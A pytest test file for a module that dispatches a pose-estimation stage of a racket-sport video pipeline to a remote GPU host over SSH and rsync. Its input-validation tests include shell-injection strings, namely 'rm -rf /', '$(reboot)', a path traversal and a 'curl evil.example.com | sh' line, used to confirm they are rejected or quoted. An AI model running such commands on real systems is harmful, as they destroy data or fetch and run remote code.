from __future__ import annotations

import json
import shlex
import subprocess
import sys
import argparse
from pathlib import Path
from typing import Any

import pytest

from scripts.racketsport import remote_body_dispatch as rbd


def _completed(returncode: int, stdout: str = "", stderr: str = "") -> "subprocess.CompletedProcess[str]":
    return subprocess.CompletedProcess(args=[], returncode=returncode, stdout=stdout, stderr=stderr)


def _write_json(path: Path, payload: Any) -> None:
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(json.dumps(payload), encoding="utf-8")


def _clip_dir_with_tracks(tmp_path: Path) -> Path:
    clip_dir = tmp_path / "clip"
    clip_dir.mkdir()
    _write_json(clip_dir / "tracks.json", {"schema_version": 1, "fps": 30.0, "players": [], "rally_spans": []})
    (clip_dir / "source.mp4").write_bytes(b"not a real video")
    return clip_dir


def test_check_remote_reachable_true_on_zero_exit() -> None:
    calls: list[list[str]] = []

    def fake_run(cmd, timeout_s):  # noqa: ANN001
        calls.append(list(cmd))
        return _completed(0)

    assert rbd.check_remote_reachable(rbd.RemoteConfig(), run=fake_run) is True
    assert calls[0][0] == "ssh"


def test_check_remote_reachable_false_on_timeout() -> None:
    def fake_run(cmd, timeout_s):  # noqa: ANN001
        raise subprocess.TimeoutExpired(cmd=cmd, timeout=timeout_s or 1)

    assert rbd.check_remote_reachable(rbd.RemoteConfig(), run=fake_run) is False


def test_dispatch_body_stage_raises_when_unreachable(tmp_path: Path) -> None:
    clip_dir = _clip_dir_with_tracks(tmp_path)

    def fake_run(cmd, timeout_s):  # noqa: ANN001
        return _completed(255, stderr="Connection refused")

    with pytest.raises(rbd.RemoteBodyDispatchError, match="unreachable"):
        rbd.dispatch_body_stage(
            clip="wolverine",
            clip_dir=clip_dir,
            video_path=clip_dir / "source.mp4",
            run=fake_run,
        )


def test_dispatch_body_stage_raises_without_local_tracks(tmp_path: Path) -> None:
    empty_clip_dir = tmp_path / "empty_clip"
    empty_clip_dir.mkdir()
    (empty_clip_dir / "source.mp4").write_bytes(b"x")

    call_sequence: list[str] = []

    def fake_run(cmd, timeout_s):  # noqa: ANN001
        if cmd[0] == "ssh" and cmd[-1] == "true":
            call_sequence.append("reachable")
            return _completed(0)
        if cmd[0] == "ssh" and cmd[-1].startswith("test -e"):
            call_sequence.append("preflight")
            return _completed(0)
        if cmd[0] == "ssh":
            call_sequence.append("mkdir")
            return _completed(0)
        raise AssertionError(f"unexpected command before rsync guard: {cmd}")

    with pytest.raises(rbd.RemoteBodyDispatchError, match="tracks.json"):
        rbd.dispatch_body_stage(
            clip="wolverine",
            clip_dir=empty_clip_dir,
            video_path=empty_clip_dir / "source.mp4",
            run=fake_run,
        )
    assert call_sequence == ["reachable", "preflight", "mkdir"]


def test_dispatch_body_stage_reports_lock_busy_on_gpu_lock_wait_exit_code(tmp_path: Path) -> None:
    """Task #46 timeout split: exit 75 is scripts/gpu-eval-run.sh's own
    GPU_LOCK_TIMEOUT_S flock timeout -- the shared lock was genuinely busy."""

    clip_dir = _clip_dir_with_tracks(tmp_path)
    steps: list[str] = []

    def fake_run(cmd, timeout_s):  # noqa: ANN001
        if cmd[0] == "ssh" and cmd[-1] == "true":
            return _completed(0)
        if cmd[0] == "ssh" and cmd[-1].startswith("test -e"):
            return _completed(0)
        if cmd[0] == "ssh" and cmd[-1].startswith("mkdir"):
            return _completed(0)
        if cmd[0] == "rsync":
            steps.append("rsync_up")
            return _completed(0)
        if cmd[0] == "ssh":
            steps.append("remote_command")
            return _completed(75, stdout="gpu-eval-run: timed out after 60s waiting for full-gpu.lock")
        raise AssertionError(f"unexpected command: {cmd}")

    with pytest.raises(rbd.RemoteBodyDispatchError, match="lock busy"):
        rbd.dispatch_body_stage(
            clip="wolverine",
            clip_dir=clip_dir,
            video_path=clip_dir / "source.mp4",
            run=fake_run,
        )
    assert "remote_command" in steps


def test_dispatch_body_stage_reports_command_budget_exceeded_on_timeout_exit_code(tmp_path: Path) -> None:
    """Task #46 timeout split: exit 124 now means the *overall* remote BODY run
    exceeded command_timeout_s -- it must NOT be misreported as "lock busy"
    (the old behavior, which SIGKILLed any real >60s BODY run mid-inference)."""

    clip_dir = _clip_dir_with_tracks(tmp_path)

    def fake_run(cmd, timeout_s):  # noqa: ANN001
        if cmd[0] == "ssh" and (cmd[-1] == "true" or cmd[-1].startswith(("test -e", "mkdir"))):
            return _completed(0)
        if cmd[0] == "rsync":
            return _completed(0)
        if cmd[0] == "ssh":
            return _completed(124, stdout="")
        raise AssertionError(f"unexpected command: {cmd}")

    with pytest.raises(rbd.RemoteBodyDispatchError) as exc_info:
        rbd.dispatch_body_stage(
            clip="wolverine",
            clip_dir=clip_dir,
            video_path=clip_dir / "source.mp4",
            run=fake_run,
        )
    message = str(exc_info.value)
    assert "command budget" in message
    assert "lock busy" not in message


def test_dispatch_body_stage_bounds_local_ssh_wait_and_reports_hang(tmp_path: Path) -> None:
    clip_dir = _clip_dir_with_tracks(tmp_path)
    seen_timeouts: list[float | None] = []

    def fake_run(cmd, timeout_s):  # noqa: ANN001
        if cmd[0] == "ssh" and (cmd[-1] == "true" or cmd[-1].startswith(("test -e", "mkdir"))):
            return _completed(0)
        if cmd[0] == "rsync":
            return _completed(0)
        if cmd[0] == "ssh":
            seen_timeouts.append(timeout_s)
            raise subprocess.TimeoutExpired(cmd=cmd, timeout=timeout_s or 1)
        raise AssertionError(f"unexpected command: {cmd}")

    config = rbd.RemoteConfig(command_timeout_s=300)
    with pytest.raises(rbd.RemoteBodyDispatchError, match="no result within"):
        rbd.dispatch_body_stage(
            clip="wolverine",
            clip_dir=clip_dir,
            video_path=clip_dir / "source.mp4",
            config=config,
            run=fake_run,
        )
    # the local subprocess guard sits slightly above the remote-side budget.
    assert seen_timeouts == [420]


def test_dispatch_body_stage_success_syncs_outputs_back(tmp_path: Path) -> None:
    clip_dir = _clip_dir_with_tracks(tmp_path)
    remote_marker: dict[str, str] = {}

    def fake_run(cmd, timeout_s):  # noqa: ANN001
        if cmd[0] == "ssh" and cmd[-1] == "true":
            return _completed(0)
        if cmd[0] == "ssh" and cmd[-1].startswith("mkdir"):
            return _completed(0)
        if cmd[0] == "rsync":
            src, dst = cmd[-2], cmd[-1]
            if dst.startswith(str(rbd.DEFAULT_REMOTE_HOST)) or ":" in dst:
                # rsync "up": local -> remote (dst contains host:path)
                remote_marker[Path(src).name if Path(src).exists() else src] = "uploaded"
            else:
                # rsync "down": remote -> local; simulate the remote producing smpl_motion.json
                if src.endswith("smpl_motion.json"):
                    _write_json(Path(dst), {"schema_version": 1, "model": "sam3dbody_world_joints", "fps": 30.0, "world_frame": "court_Z0", "players": []})
                    return _completed(0)
                return _completed(1, stderr="not found")
            return _completed(0)
        if cmd[0] == "ssh":
            return _completed(0, stdout="body stage ok")
        raise AssertionError(f"unexpected command: {cmd}")

    result = rbd.dispatch_body_stage(
        clip="wolverine",
        clip_dir=clip_dir,
        video_path=clip_dir / "source.mp4",
        run=fake_run,
    )
    assert result.status == "ran"
    assert "smpl_motion.json" in result.synced_outputs
    assert (clip_dir / "smpl_motion.json").is_file()


def test_remote_body_outputs_cannot_overwrite_local_calibration_or_world_bundle() -> None:
    assert "court_calibration.json" not in rbd.BODY_OUTPUT_ARTIFACTS
    assert "court_zones.json" not in rbd.BODY_OUTPUT_ARTIFACTS
    assert "net_plane.json" not in rbd.BODY_OUTPUT_ARTIFACTS
    assert "virtual_world.json" not in rbd.BODY_OUTPUT_ARTIFACTS


def test_dispatch_body_stage_raises_when_no_outputs_synced(tmp_path: Path) -> None:
    clip_dir = _clip_dir_with_tracks(tmp_path)

    def fake_run(cmd, timeout_s):  # noqa: ANN001
        if cmd[0] == "ssh" and cmd[-1] == "true":
            return _completed(0)
        if cmd[0] == "ssh" and cmd[-1].startswith("mkdir"):
            return _completed(0)
        if cmd[0] == "rsync":
            src = cmd[-2]
            is_upload = ":" in cmd[-1]
            if is_upload:
                return _completed(0)
            # download: remote has nothing to give back for any output artifact.
            return _completed(1, stderr="no such file")
        if cmd[0] == "ssh":
            return _completed(0, stdout="ran but wrote nothing useful")
        raise AssertionError(f"unexpected command: {cmd}")

    with pytest.raises(rbd.RemoteBodyDispatchError, match="produced no"):
        rbd.dispatch_body_stage(
            clip="wolverine",
            clip_dir=clip_dir,
            video_path=clip_dir / "source.mp4",
            run=fake_run,
        )


def test_remote_command_wraps_with_shared_eval_lock_and_split_timeouts() -> None:
    config = rbd.RemoteConfig(lock_wait_timeout_s=42, command_timeout_s=1234)
    command = rbd._remote_body_command(remote_run_dir="/remote/run", config=config)
    # Task #46 timeout split: the lock wait is bounded via gpu-eval-run.sh's own
    # GPU_LOCK_TIMEOUT_S (exit 75), while the outer `timeout` is the generous
    # overall run budget (exit 124) -- NOT the lock-wait value, which used to
    # SIGKILL any real BODY run longer than 60s mid-inference.
    assert "GPU_LOCK_TIMEOUT_S=42" in command
    assert "timeout 1234s" in command
    assert "timeout 42s" not in command
    assert "RTMW3D_PROJECT_PYTHONPATH=" not in command


def test_phase_d_dispatch_config_documents_static_intrinsics_warmup_and_stall_gate() -> None:
    config = rbd.RemoteConfig(
        sam3d_crop_bucket_sizes=(8, 16),
        sam3d_torch_compile=True,
        sam3d_compile_warmup_buckets=(8, 16),
    )

    payload = rbd.build_phase_d_sam3d_dispatch_config(config)

    optimization = payload["optimization"]
    assert optimization["batching"] == "static_intrinsics_cross_frame_bucketed_body_batch"
    assert optimization["crop_bucket_sizes"] == [8, 16]
    assert optimization["torch_compile"] is True
    assert optimization["compile_warmup_buckets"] == [8, 16]
    assert optimization["compile_warmup_passes"] == 2
    assert optimization["steady_state_empty_cache"] is True
    assert optimization["inner_bucket_sync"] is True
    assert optimization["upstream_env"] == {}
    assert optimization["tier2_output_lite"] is False
    assert optimization["static_clip_intrinsics_contract"] == {
        "source_artifact": "court_calibration.json",
        "request_field": "clip_intrinsics",
        "batch_runner_kwarg": "clip_intrinsics",
        "shape": [1, 3, 3],
        "warmup_bucket_shapes_match_real_execution": True,
        "warmup_passes_per_shape": 2,
        "per_request_camera_intrinsics_policy": "must_match_or_error",
    }
    assert optimization["real_batched_execution"]["bucket_sizes_to_measure"] == [8, 16]
    assert payload["a100_stall_regression_check"]["max_first_measured_call_after_warmup_s"] == 1.0
    assert payload["a100_stall_regression_check"]["fails_if_first_call_exceeds_s"] == 2.0
    assert "hand-built forward_step batch" in payload["a100_stall_regression_check"]["guard_hypothesis"]
    assert "torch.inference_mode" in payload["a100_stall_regression_check"]["guard_hypothesis"]
    assert any(
        "batch_guard_signatures" in step
        for step in payload["a100_stall_regression_check"]["procedure"]
    )
    assert "process_one_image" not in json.dumps(payload["a100_stall_regression_check"])


def test_remote_body_dispatch_cli_help_direct_reference() -> None:
    command_path = "scripts/racketsport/remote_body_dispatch.py"

    completed = subprocess.run(
        [sys.executable, command_path, "--help"],
        check=True,
        capture_output=True,
        text=True,
    )

    assert "--clip" in completed.stdout
    assert "--sam3d-body-input-size-px" in completed.stdout
    assert "--sam3d-crop-bucket-sizes" in completed.stdout
    assert "--sam3d-compile-warmup-buckets" in completed.stdout
    assert "--sam3d-compile-warmup-passes" in completed.stdout
    assert "--no-sam3d-torch-compile" in completed.stdout
    assert "--serialize-tier2-mesh-vertices" in completed.stdout
    assert "--no-sam3d-steady-state-empty-cache" in completed.stdout
    assert "--no-sam3d-inner-bucket-sync" in completed.stdout
    assert "--sam3d-upstream-env" in completed.stdout
    assert "--sam3d-tier2-output-lite" in completed.stdout
    config = rbd.RemoteConfig(lock_wait_timeout_s=42, command_timeout_s=1234)
    command = rbd._remote_body_command(remote_run_dir="/remote/run", config=config)
    assert config.gpu_lock_script in command
    assert "gpu-train-lock" not in command  # must use the shared eval lock, never the exclusive training lock
    assert "/remote/run/remote_body_runner.py" in command
    assert "RTMW3D_PROJECT_PYTHONPATH=" not in command


def test_remote_body_runner_script_registers_vm_proven_body_configuration() -> None:
    """Task #46: the generated remote runner must register a BodyStageRunner
    with the VM1-proven detector/fov configuration (both disabled -- the only
    configuration that has produced real meshes on VM1, since the moge FOV
    checkpoint does not exist on that host) and gate its exit code on the BODY
    stage's own StageRun status, not run_pipeline's aggregate status."""

    config = rbd.RemoteConfig()
    script = rbd._remote_body_runner_script(
        clip="wolverine", remote_run_dir="/remote/run", config=config, max_frames=50, max_players=4
    )

    assert 'stage="body"' in script
    assert "max_frames=50" in script
    assert "max_players=4" in script
    assert "detector_name=''" in script
    assert "fov_name=''" in script
    assert 'tracking_mode="precomputed_tracks"' in script
    assert "body_ran" in script
    # a real Lane A skeleton with zero tier-rule-scheduled mesh frames is a
    # legitimate skeleton-level success (exit 0), never a fabricated mesh.
    assert "skeleton_level_only" in script
    assert "pose_ran" not in script
    assert "adaptive BODY schedule contains no SAM3D body-mode frames" in script
    assert "no world_mesh frames" not in script
    # the script must compile as valid python.
    compile(script, "remote_body_runner.py", "exec")


def test_remote_body_success_flags_accept_real_sam3d_skeleton_only_body_status() -> None:
    summary = {
        "status": "blocked",
        "stages": [
            {"stage": "calibration", "status": "ran", "notes": []},
            {"stage": "tracking", "status": "ran", "notes": []},
            {
                "stage": "body",
                "status": "failed",
                "notes": ["adaptive BODY schedule contains no SAM3D body-mode frames"],
            },
        ],
    }

    flags = rbd._remote_body_success_flags(summary, skeleton_exists=True)

    assert flags["body_ran"] is False
    assert flags["skeleton_level_only"] is True
    assert flags["no_sam3d_body_mode_frames"] is True
    assert flags["requires_pose_stage"] is False


def test_remote_body_runner_script_wires_sam3d_tier2_bench_config() -> None:
    config = rbd.RemoteConfig(
        sam3d_body_input_size_px=512,
        sam3d_crop_bucket_sizes=(8, 16),
        sam3d_crop_padding_scale=1.35,
        sam3d_mask_prompt_mode="manifest",
        sam3d_soft_background_alpha=0.65,
        sam3d_torch_compile=True,
        sam3d_compile_warmup_buckets=(8, 16),
        sam3d_skip_tier2_mesh_vertices=True,
        sam3d_steady_state_empty_cache=False,
        sam3d_inner_bucket_sync=False,
        sam3d_upstream_env={"USE_COMPILE_BACKBONE": "1", "MHR_NO_CORRECTIVES": "1"},
        sam3d_tier2_output_lite=True,
    )

    script = rbd._remote_body_runner_script(
        clip="wolverine", remote_run_dir="/remote/run", config=config, max_frames=None, max_players=4
    )

    assert "tier2_body_joints_all_tracked=True" in script
    assert "mesh_vertex_serialization_policy='tier1_only'" in script
    assert "sam3d_body_input_size_px=512" in script
    assert "sam3d_crop_bucket_sizes=(8, 16)" in script
    assert "sam3d_crop_padding_scale=1.35" in script
    assert "sam3d_mask_prompt_mode='manifest'" in script
    assert "sam3d_soft_background_alpha=0.65" in script
    assert "sam3d_torch_compile=True" in script
    assert "sam3d_compile_warmup_buckets=(8, 16)" in script
    assert "sam3d_compile_warmup_passes=2" in script
    assert "sam3d_steady_state_empty_cache=False" in script
    assert "sam3d_inner_bucket_sync=False" in script
    assert "sam3d_upstream_env={'USE_COMPILE_BACKBONE': '1', 'MHR_NO_CORRECTIVES': '1'}" in script
    assert "sam3d_tier2_output_lite=True" in script
    assert '"source": "sam3d_tier2_impl_20260703T0xZ"' in script
    assert '"phase_d_source": "phase_d_speed_opt_20260703T0xZ"' in script
    assert '"source": "sam3d_accuracy_opt_20260703T0xZ"' in script
    assert '"steady_state_empty_cache": false' in script
    assert '"inner_bucket_sync": false' in script
    assert '"upstream_env": {' in script
    assert '"tier2_output_lite": true' in script
    compile(script, "remote_body_runner.py", "exec")


def test_parse_sam3d_upstream_env_tuple_allows_only_approved_keys() -> None:
    parsed = rbd._parse_sam3d_upstream_env_tuple(
        "USE_COMPILE_BACKBONE=1,DECODER_COMPILE=1,INTERM_COMPILE=0,INTERM_SLIM=1,COMPILE_MODE=reduce-overhead,MHR_NO_CORRECTIVES=1"
    )

    assert parsed == {
        "USE_COMPILE_BACKBONE": "1",
        "DECODER_COMPILE": "1",
        "INTERM_COMPILE": "0",
        "INTERM_SLIM": "1",
        "COMPILE_MODE": "reduce-overhead",
        "MHR_NO_CORRECTIVES": "1",
    }

    with pytest.raises(argparse.ArgumentTypeError, match="unsupported SAM3D upstream env key"):
        rbd._parse_sam3d_upstream_env_tuple("USE_TRT_BACKBONE=1")


def test_dispatch_body_stage_writes_and_syncs_runner_script(tmp_path: Path) -> None:
    clip_dir = _clip_dir_with_tracks(tmp_path)
    uploaded: list[str] = []

    def fake_run(cmd, timeout_s):  # noqa: ANN001
        if cmd[0] == "ssh" and (cmd[-1] == "true" or cmd[-1].startswith(("test -e", "mkdir"))):
            return _completed(0)
        if cmd[0] == "rsync":
            if ":" in cmd[-1]:  # upload
                uploaded.append(Path(cmd[-2]).name)
                return _completed(0)
            if cmd[-2].endswith("smpl_motion.json"):
                _write_json(Path(cmd[-1]), {"schema_version": 1, "model": "sam3dbody_world_joints", "fps": 30.0, "world_frame": "court_Z0", "players": []})
                return _completed(0)
            return _completed(1, stderr="not found")
        if cmd[0] == "ssh":
            return _completed(0, stdout='{"body_ran": true}')
        raise AssertionError(f"unexpected command: {cmd}")

    result = rbd.dispatch_body_stage(
        clip="wolverine",
        clip_dir=clip_dir,
        video_path=clip_dir / "source.mp4",
        run=fake_run,
    )
    assert result.status == "ran"
    assert (clip_dir / "remote_body_runner.py").is_file()
    assert "remote_body_runner.py" in uploaded


# --- Finding 7: SSH host-key verification is pinned, not disabled --------


def test_ssh_base_enables_strict_host_key_checking_with_pinned_known_hosts() -> None:
    config = rbd.RemoteConfig()
    command = config.ssh_base()

    assert "StrictHostKeyChecking=yes" in command
    assert "StrictHostKeyChecking=no" not in command
    assert any(part.startswith("UserKnownHostsFile=") for part in command)
    known_hosts_arg = next(part for part in command if part.startswith("UserKnownHostsFile="))
    known_hosts_path = Path(known_hosts_arg.split("=", 1)[1])
    assert known_hosts_path.name == "a100_known_hosts"
    assert known_hosts_path.is_file()
    assert "34.126.67.233" in known_hosts_path.read_text(encoding="utf-8")


def test_default_known_hosts_file_is_a_valid_pinned_entry_for_the_default_host() -> None:
    # Sanity check the pinned file itself (not just that ssh_base references
    # it): it must actually contain a known_hosts-format line for the
    # default remote host's IP, with a real-looking base64 key blob, so a
    # copy/paste or content mistake here would fail this test rather than
    # silently degrade host-key checking once it's wired into ssh_base().
    known_hosts_path = Path(rbd.DEFAULT_KNOWN_HOSTS_FILE)
    text = known_hosts_path.read_text(encoding="utf-8")
    host = rbd.DEFAULT_REMOTE_HOST.split("@", 1)[-1]
    data_lines = [line for line in text.splitlines() if line.strip() and not line.startswith("#")]
    assert data_lines, "known_hosts file has no key entries"
    for line in data_lines:
        fields = line.split()
        assert len(fields) == 3, line
        addr, key_type, blob = fields
        assert addr == host
        assert key_type in {"ssh-rsa", "ssh-ed25519", "ecdsa-sha2-nistp256"}
        assert len(blob) > 60


def test_private_ssh_material_under_configs_ssh_is_ignored_but_pinned_known_hosts_is_trackable() -> None:
    private_key_check = subprocess.run(
        ["git", "check-ignore", "-q", "configs/ssh/a100_id_ed25519"],
        check=False,
    )
    known_hosts_check = subprocess.run(
        ["git", "check-ignore", "-q", "configs/ssh/a100_known_hosts"],
        check=False,
    )

    assert private_key_check.returncode == 0
    assert known_hosts_check.returncode == 1


def test_rsync_ssh_command_also_uses_strict_host_key_checking() -> None:
    config = rbd.RemoteConfig()
    rsync_ssh = config.rsync_ssh_command()

    assert "StrictHostKeyChecking=yes" in rsync_ssh
    assert "StrictHostKeyChecking=no" not in rsync_ssh
    assert "UserKnownHostsFile=" in rsync_ssh


def test_rsync_up_and_down_do_not_disable_host_key_checking(tmp_path: Path) -> None:
    clip_dir = _clip_dir_with_tracks(tmp_path)
    seen_rsync_ssh_args: list[str] = []

    def fake_run(cmd, timeout_s):  # noqa: ANN001
        if cmd[0] == "rsync":
            e_index = cmd.index("-e")
            seen_rsync_ssh_args.append(cmd[e_index + 1])
            return _completed(0)
        raise AssertionError(f"unexpected non-rsync command: {cmd}")

    rbd._rsync_up(clip_dir, clip_dir / "source.mp4", None, "/remote/run", rbd.RemoteConfig(), run=fake_run)
    assert seen_rsync_ssh_args
    for rsync_ssh in seen_rsync_ssh_args:
        assert "StrictHostKeyChecking=no" not in rsync_ssh
        assert "StrictHostKeyChecking=yes" in rsync_ssh


# --- Finding 8: clip ids are validated and shell tokens are quoted -------


def test_validate_clip_id_accepts_safe_ids() -> None:
    assert rbd._validate_clip_id("wolverine_mixed_0200_mid_steep_corner") == "wolverine_mixed_0200_mid_steep_corner"
    assert rbd._validate_clip_id("clip-1.2") == "clip-1.2"


@pytest.mark.parametrize(
    "hostile_clip",
    [
        "wolverine; rm -rf /",
        "$(reboot)",
        "clip`whoami`",
        "clip && curl evil.example.com | sh",
        "clip with spaces",
        "../../etc/passwd",
        "",
        "clip\nrm -rf /",
    ],
)
def test_dispatch_body_stage_rejects_hostile_clip_ids_before_any_ssh_call(tmp_path: Path, hostile_clip: str) -> None:
    clip_dir = _clip_dir_with_tracks(tmp_path)
    calls: list[list[str]] = []

    def fake_run(cmd, timeout_s):  # noqa: ANN001
        calls.append(list(cmd))
        return _completed(0)

    with pytest.raises(rbd.RemoteBodyDispatchError, match="unsafe clip id"):
        rbd.dispatch_body_stage(
            clip=hostile_clip,
            clip_dir=clip_dir,
            video_path=clip_dir / "source.mp4",
            run=fake_run,
        )

    # The whole point of validating up front is that dispatch never even
    # attempts a network round-trip (SSH/rsync) for a rejected clip id.
    assert calls == []


def test_remote_body_command_quotes_hostile_run_dir_as_a_single_argument() -> None:
    # The clip id feeds remote_run_dir (and is separately validated by
    # _validate_clip_id before dispatch), but _remote_body_command can be
    # called directly -- a hostile path must stay one shell token, never
    # terminate the string early or inject a new command via `;`/`#`.
    config = rbd.RemoteConfig()
    hostile_run_dir = "/remote/run'; rm -rf / #"

    command = rbd._remote_body_command(remote_run_dir=hostile_run_dir, config=config)

    tokens = shlex.split(command)
    # the runner-script path (hostile run dir + filename) parses back as
    # exactly one token -- proof that shlex.quote's escaping was applied.
    assert f"{hostile_run_dir}/remote_body_runner.py" in tokens
    # No stray `rm` command should appear as its own token anywhere.
    assert "rm" not in tokens


def test_remote_body_runner_script_embeds_hostile_clip_as_inert_string_literal() -> None:
    # dispatch_body_stage always validates clip ids first, but the generator
    # can be called directly: repr() embedding must keep a hostile clip id an
    # inert python string literal (the script still compiles, and the value
    # round-trips exactly).
    hostile_clip = "clip'; rm -rf / #\nimport os"
    script = rbd._remote_body_runner_script(
        clip=hostile_clip, remote_run_dir="/remote/run", config=rbd.RemoteConfig(), max_frames=None, max_players=4
    )
    compile(script, "remote_body_runner.py", "exec")
    assert repr(hostile_clip) in script


def test_mkdir_command_quotes_remote_run_dir_for_hostile_clip(tmp_path: Path) -> None:
    clip_dir = _clip_dir_with_tracks(tmp_path)
    captured_mkdir_cmd: list[str] = []

    def fake_run(cmd, timeout_s):  # noqa: ANN001
        if cmd[0] == "ssh" and cmd[-1] == "true":
            return _completed(0)
        if cmd[0] == "ssh" and "mkdir" in cmd[-1]:
            captured_mkdir_cmd.append(cmd[-1])
            return _completed(0)
        if cmd[0] == "rsync":
            return _completed(0)
        if cmd[0] == "ssh":
            return _completed(0, stdout="ok")
        raise AssertionError(f"unexpected command: {cmd}")

    # A clip id with a shell metacharacter that still matches the safe
    # pattern is not possible (the regex forbids it), so this exercises the
    # quoting on the *directory path* itself, which also contains
    # config.repo/config.run_root -- shlex.quote must still produce a
    # command `mkdir -p` accepts as a single argument.
    try:
        rbd.dispatch_body_stage(
            clip="wolverine",
            clip_dir=clip_dir,
            video_path=clip_dir / "source.mp4",
            run=fake_run,
        )
    except rbd.RemoteBodyDispatchError:
        pass

    assert captured_mkdir_cmd
    mkdir_cmd = captured_mkdir_cmd[0]
    tokens = shlex.split(mkdir_cmd)
    assert tokens[0] == "mkdir"
    assert tokens[1] == "-p"
    assert len(tokens) == 3  # the whole remote path parses back as one argument
    assert tokens[2].endswith("/body_frames")


# --- Finding 7 (review_diff_20260702.md): canonical remote root + VM-layout
# preflight, failing fast with the exact missing path -----------------------


def test_default_remote_paths_share_one_canonical_root() -> None:
    # DEFAULT_REMOTE_REPO, DEFAULT_REMOTE_PYTHON, and the Fast-SAM defaults
    # each used to hardcode their own copy of "/home/arnavchokshi"; now they
    # all derive from DEFAULT_REMOTE_HOME so a VM/user change is one edit.
    home = rbd.DEFAULT_REMOTE_HOME
    assert home == "/home/arnavchokshi"
    assert rbd.DEFAULT_REMOTE_REPO.startswith(home + "/")
    assert rbd.DEFAULT_REMOTE_PYTHON.startswith(home + "/")
    assert rbd.DEFAULT_REMOTE_FAST_SAM_PYTHON.startswith(home + "/")
    assert rbd.DEFAULT_REMOTE_FAST_SAM_ROOT.startswith(home + "/")
    # The venv split (orchestrator venv vs. Fast-SAM's own venv) stays real
    # and intentional -- canonicalizing the root must not paper over it.
    assert rbd.DEFAULT_REMOTE_PYTHON != rbd.DEFAULT_REMOTE_FAST_SAM_PYTHON


def test_remote_layout_checks_cover_repo_python_lock_script_and_fast_sam_paths() -> None:
    config = rbd.RemoteConfig()
    checks = rbd._remote_layout_checks(config)
    labels = [label for label, _ in checks]
    paths = dict(checks)

    assert labels[0] == "remote repo"  # checked first: everything else is relative to it
    assert paths["remote repo"] == config.repo
    assert paths["remote python interpreter"] == config.python
    assert paths["gpu lock script"] == f"{config.repo}/{config.gpu_lock_script}"
    assert paths["Fast-SAM-3D-Body python interpreter"] == config.fast_sam_python
    assert paths["Fast-SAM-3D-Body root"] == config.fast_sam_root
    assert all("RTMW3D" not in label for label in labels)


def test_check_remote_layout_passes_when_all_paths_exist() -> None:
    calls: list[list[str]] = []

    def fake_run(cmd, timeout_s):  # noqa: ANN001
        calls.append(list(cmd))
        return _completed(0)

    rbd.check_remote_layout(rbd.RemoteConfig(), run=fake_run)  # must not raise

    assert len(calls) == 1
    assert calls[0][0] == "ssh"
    assert calls[0][-1].startswith("test -e")


def test_check_remote_layout_raises_with_exact_missing_path() -> None:
    def fake_run(cmd, timeout_s):  # noqa: ANN001
        return _completed(
            7,
            stdout="MISSING:Fast-SAM-3D-Body root:/home/arnavchokshi/body_runtime/Fast-SAM-3D-Body\n",
        )

    with pytest.raises(rbd.RemoteBodyDispatchError) as exc_info:
        rbd.check_remote_layout(rbd.RemoteConfig(), run=fake_run)

    message = str(exc_info.value)
    assert "Fast-SAM-3D-Body root" in message
    assert "/home/arnavchokshi/body_runtime/Fast-SAM-3D-Body" in message


def test_check_remote_layout_raises_generic_message_without_missing_marker() -> None:
    def fake_run(cmd, timeout_s):  # noqa: ANN001
        return _completed(255, stderr="ssh_exchange_identification: read: Connection reset by peer")

    with pytest.raises(rbd.RemoteBodyDispatchError, match="Connection reset"):
        rbd.check_remote_layout(rbd.RemoteConfig(), run=fake_run)


def test_remote_layout_preflight_command_stops_at_first_missing_path() -> None:
    # The command chains checks with `&&`, and each check's `|| { ...; exit 7; }`
    # exits the whole remote shell (not a subshell) on the first miss, so
    # later checks in the chain never execute once one has failed.
    config = rbd.RemoteConfig()
    command = rbd._remote_layout_preflight_command(config)
    checks = rbd._remote_layout_checks(config)

    assert command.startswith("test -e")
    assert command.count("&&") == len(checks) - 1
    assert "exit 7" in command
    for label, path in checks:
        assert f"MISSING:{label}:{path}" in command


def test_dispatch_body_stage_runs_preflight_before_mkdir_and_rsync(tmp_path: Path) -> None:
    clip_dir = _clip_dir_with_tracks(tmp_path)
    steps: list[str] = []

    def fake_run(cmd, timeout_s):  # noqa: ANN001
        if cmd[0] == "ssh" and cmd[-1] == "true":
            steps.append("reachable")
            return _completed(0)
        if cmd[0] == "ssh" and cmd[-1].startswith("test -e"):
            steps.append("preflight")
            return _completed(0)
        if cmd[0] == "ssh" and cmd[-1].startswith("mkdir"):
            steps.append("mkdir")
            return _completed(0)
        if cmd[0] == "rsync":
            steps.append("rsync")
            return _completed(0)
        if cmd[0] == "ssh":
            steps.append("remote_command")
            return _completed(0, stdout="body stage ok")
        raise AssertionError(f"unexpected command: {cmd}")

    with pytest.raises(rbd.RemoteBodyDispatchError, match="produced no"):
        rbd.dispatch_body_stage(
            clip="wolverine",
            clip_dir=clip_dir,
            video_path=clip_dir / "source.mp4",
            run=fake_run,
        )

    assert steps[0] == "reachable"
    assert steps[1] == "preflight"
    assert steps.index("preflight") < steps.index("mkdir")
    assert steps.index("mkdir") < steps.index("rsync")


def test_dispatch_body_stage_fails_fast_on_preflight_before_any_mkdir_or_rsync(tmp_path: Path) -> None:
    clip_dir = _clip_dir_with_tracks(tmp_path)
    calls: list[list[str]] = []

    def fake_run(cmd, timeout_s):  # noqa: ANN001
        calls.append(list(cmd))
        if cmd[0] == "ssh" and cmd[-1] == "true":
            return _completed(0)
        if cmd[0] == "ssh" and cmd[-1].startswith("test -e"):
            return _completed(
                7,
                stdout=(
                    "MISSING:remote python interpreter:"
                    "/home/arnavchokshi/pickleball_git/.venv/bin/python\n"
                ),
            )
        raise AssertionError(f"unexpected command: {cmd}")

    with pytest.raises(rbd.RemoteBodyDispatchError, match="remote python interpreter"):
        rbd.dispatch_body_stage(
            clip="wolverine",
            clip_dir=clip_dir,
            video_path=clip_dir / "source.mp4",
            run=fake_run,
        )

    # Only the reachability probe and the preflight check ran -- no mkdir,
    # no rsync -- proving the VM-layout check happens before any of that.
    assert [call[0] for call in calls] == ["ssh", "ssh"]
    assert calls[1][-1].startswith("test -e")
